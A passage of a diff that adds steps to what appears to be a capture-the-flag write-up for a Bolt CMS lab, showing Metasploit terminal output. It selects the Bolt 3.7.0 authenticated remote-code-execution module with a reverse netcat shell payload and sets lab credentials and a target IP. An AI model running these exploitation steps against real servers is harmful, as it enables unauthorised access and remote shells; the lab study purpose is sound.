@@ -226,6 +226,128 @@ DOWNLOADED: 4612 - FOUND: 5
 > Vulnerability Identification Using Metasploit
 14. `msfconsole`
 15. `search Bolt 3.7`
+```bash
+┌──(kali㉿kali)-[~]
+└─$ msfconsole 
+                                                  
+
+ ______________________________________________________________________________
+|                                                                              |
+|                          3Kom SuperHack II Logon                             |
+|______________________________________________________________________________|
+|                                                                              |
+|                                                                              |
+|                                                                              |
+|                 User Name:          [   security    ]                        |
+|                                                                              |
+|                 Password:           [               ]                        |
+|                                                                              |
+|                                                                              |
+|                                                                              |
+|                                   [ OK ]                                     |
+|______________________________________________________________________________|
+|                                                                              |
+|                                                       https://metasploit.com |
+|______________________________________________________________________________|
+
+
+       =[ metasploit v6.3.23-dev-                         ]
++ -- --=[ 2329 exploits - 1218 auxiliary - 413 post       ]
++ -- --=[ 1385 payloads - 46 encoders - 11 nops           ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit tip: Use the resource command to run 
+commands from a file
+Metasploit Documentation: https://docs.metasploit.com/
+
+msf6 > 
+```
+```bash
+msf6 > search Bolt 3.7
+
+Matching Modules
+================
+
+   #  Name                                        Disclosure Date  Rank   Check  Description
+   -  ----                                        ---------------  ----   -----  -----------
+   0  exploit/unix/webapp/bolt_authenticated_rce  2020-05-07       great  Yes    Bolt CMS 3.7.0 - Authenticated Remote Code Execution
+
+
+Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/webapp/bolt_authenticated_rce
+
+msf6 >
+```
+16. `use {EXPLOIT PATH}`
+17. `show options`
+```bash
+msf6 > use exploit/unix/webapp/bolt_authenticated_rce
+[*] Using configured payload cmd/unix/reverse_netcat
+msf6 exploit(unix/webapp/bolt_authenticated_rce) >
+```
+```bash
+msf6 exploit(unix/webapp/bolt_authenticated_rce) > show options
+
+Module options (exploit/unix/webapp/bolt_authenticated_rce):
+
+   Name                 Current Setting        Required  Description
+   ----                 ---------------        --------  -----------
+   FILE_TRAVERSAL_PATH  ../../../public/files  yes       Traversal path from "/files" on the web server to "/root" on the server
+   PASSWORD                                    yes       Password to authenticate with
+   Proxies                                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT                8000                   yes       The target port (TCP)
+   SSL                  false                  no        Negotiate SSL/TLS for outgoing connections
+   SSLCert                                     no        Path to a custom SSL certificate (default is randomly generated)
+   TARGETURI            /                      yes       Base path to Bolt CMS
+   URIPATH                                     no        The URI to use for this exploit (default is random)
+   USERNAME                                    yes       Username to authenticate with
+   VHOST                                       no        HTTP server virtual host
+
+
+   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addre
+                                       sses.
+   SRVPORT  8080             yes       The local port to listen on.
+
+
+Payload options (cmd/unix/reverse_netcat):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   2   Linux (cmd)
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(unix/webapp/bolt_authenticated_rce) > 
+```
+18. `set PASSWORD {JAKE'S PASSWORD}`
+19. `set RHOSTS {TARGET IP}`
+20. `set USERNAME {JAKE'S USERNAME}`
+```bash
+msf6 exploit(unix/webapp/bolt_authenticated_rce) > set PASSWORD boltadmin123
+PASSWORD => boltadmin123
+```
+```bash
+msf6 exploit(unix/webapp/bolt_authenticated_rce) > set RHOSTS 10.10.195.64
+RHOSTS => 10.10.195.64
+```
+```bash
+msf6 exploit(unix/webapp/bolt_authenticated_rce) > set USERNAME bolt
+USERNAME => bolt
+```
 
 # Contributions
 This writeup was made by Jonmar Corpuz, founder of **KnowCybersecurity** (www.knowwwcybersecurity.com)
